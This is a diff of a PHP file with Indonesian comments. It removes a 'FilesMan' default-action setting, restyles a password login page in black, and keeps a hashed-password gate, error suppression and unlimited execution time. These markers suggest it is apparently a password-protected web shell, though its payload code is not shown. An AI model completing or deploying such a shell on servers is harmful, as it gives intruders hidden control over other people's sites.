@@ -2,11 +2,6 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
-// Konfigurasi
-$default_action = "FilesMan";
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
-
 // Konfigurasi password hash
 $stored_hashed_password = '$2a$12$uNJpbCb2EVGvoxtrwmNHk.6KNJO8UW3IERZ2HvIuTzH0gibNQnT1i'; // Gantilah ini dengan hash yang sesuai
 
@@ -28,12 +23,14 @@ function show_login_page() {
 
   /* Styling for the password input and submit button */
   input[type="password"] {
-    padding: 10px;
-    width: 80%;
-    max-width: 300px;
-    font-size: 16px;
+    padding: 8px;
+    width: 70%;
+    max-width: 200px;
+    font-size: 14px;
     margin-bottom: 10px;
     border: 2px solid #ccc;
+    background-color: #000;
+    color: #fff;
     border-radius: 4px;
     box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
     transition: border-color 0.3s ease;
@@ -45,18 +42,18 @@ function show_login_page() {
   }
 
   input[type="submit"] {
-    background-color: #007bff;
+    background-color: #000;
     color: white;
     border: none;
-    padding: 10px 20px;
-    font-size: 16px;
+    padding: 8px 16px;
+    font-size: 14px;
     border-radius: 4px;
     cursor: pointer;
     transition: background-color 0.3s ease;
   }
 
   input[type="submit"]:hover {
-    background-color: #0056b3;
+    background-color: #333;
   }
 
   #passwordField form {
@@ -128,7 +125,6 @@ if (!isset($_SESSION['authenticated'])) {
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-
 # function WAF
 
 $Array = [
